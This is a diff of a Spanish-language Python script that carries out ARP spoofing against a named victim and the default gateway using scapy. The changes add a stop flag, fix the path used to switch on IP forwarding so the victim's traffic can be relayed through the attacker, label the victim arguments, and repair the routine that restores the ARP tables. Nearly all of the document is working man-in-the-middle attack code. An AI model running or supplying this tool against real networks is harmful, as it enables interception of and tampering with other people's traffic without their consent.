@@ -41,6 +41,12 @@ def atacar(ipvictima, macvictima, macgateway):
     cont = 0
 
     while (1):
+        f = open("control.txt", "r")
+        control = f.read().rstrip('\n')
+        if control == '0':
+            f.close()
+            break
+
         packet = scapy.ARP(op=2, pdst=ipvictima, hwdst=macvictima, psrc=ipgateway)
         scapy.send(packet, count=2, verbose=False)
         packet = scapy.ARP(op=2, pdst=ipgateway, hwdst=macgateway, psrc=ipvictima)
@@ -48,23 +54,21 @@ def atacar(ipvictima, macvictima, macgateway):
         # print(f"{cont}paquets enviados")
         cont = cont + 1
         time.sleep(2)
+        f.close()
 
 
 def forwading(opcion):
     if (forwading == 0):
-        process = subprocess.Popen("echo 0 | sudo tee ip_forward", stdout=subprocess.PIPE)
+        process = subprocess.Popen("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE)
 
     elif (forwading == 1):
-        process = subprocess.Popen("echo 1 | sudo tee ip_forward", stdout=subprocess.PIPE)
+        process = subprocess.Popen("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward", stdout=subprocess.PIPE)
 
 
 def parar_ataque(ipvictima, macvictima, ipgateway, macgateway):
-    ipgateway = get_gateway()
-
-    packet = scapy.ARP(op=2, pdst=ipvictima, hwdst=macvictima, psrc=ipgateway, hwsrc=macgateway)
-    scapy.send(packet, count=2, verbose=False)
-
-    pass
+    for i in range(5):
+        packet = scapy.ARP(op=2, pdst=ipvictima, hwdst=macvictima, psrc=ipgateway, hwsrc=macgateway)
+        scapy.send(packet, count=2, verbose=False)
 
 
 hosts = list()
@@ -82,28 +86,30 @@ def main(args):
         quitarduplicados()
 
     elif args.eleccion == 'parar':
-        print("parando ataque")
-        parar_ataque(ipvictima=args.ipvictima, macvictima=args.macvictima, macgateway=args.macgw)
+        flag = subprocess.Popen("echo 0 > control.txt", shell=True,
+                                stdout=subprocess.PIPE).stdout  # flag para que sepa cuando parar
+
+        parar_ataque(ipvictima=args.ipvictima, macvictima=args.macvictima, ipgateway=args.ipgw, macgateway=args.macgw)
     elif args.eleccion == 'atacar':
+        flag = subprocess.Popen("echo 1 > control.txt", shell=True,
+                                stdout=subprocess.PIPE).stdout  # flag para que sepa cuando parar
         # print("atacando")
         if args.forward == '1':
             forwading(1)
-        atacar(ipvictima=args.ipvictima, macvictima=args.macvictima, macgateway=args.macgw)
-    elif args.eleccion == 'sniff':
-        print("atacando")
+        elif args.forward == '0':
+            forwading(0)
         atacar(ipvictima=args.ipvictima, macvictima=args.macvictima, macgateway=args.macgw)
 
 
 if __name__ == '__main__':
+    flag = subprocess.Popen("echo -1 > control.txt", shell=True, stdout=subprocess.PIPE).stdout
     parser = argparse.ArgumentParser()
-    parser.add_argument('--eleccion', type=str, default='1', help='umtiti')
-    parser.add_argument('--ipvictima', type=str, default='1', help='umtiti')
-    parser.add_argument('--macvictima', type=str, default='1', help='umtiti')
-    parser.add_argument('--macgw', type=str, default='1', help='umtiti')
-    parser.add_argument('--ipgw', type=str, default='1', help='umtiti')
-    parser.add_argument('--sniff', type=str, default='1', help='umtiti')
-    parser.add_argument('--monitor', type=str, default='1', help='umtiti')
-    parser.add_argument('--forward', type=str, default='1', help='umtiti')
+    parser.add_argument('--eleccion', type=str, default='1', help='define la accion que realizara el programa')
+    parser.add_argument('--ipvictima', type=str, default='1', help='ip de la victima a atacar')
+    parser.add_argument('--macvictima', type=str, default='1', help='mac de la victima a atacar')
+    parser.add_argument('--macgw', type=str, default='1', help='mac de la default gateway')
+    parser.add_argument('--ipgw', type=str, default='1', help='ip de la default gateway')
+    parser.add_argument('--forward', type=str, default='1', help='define el valor que tendrá el bit de forwading')
 
     args = parser.parse_args()
     main(args)
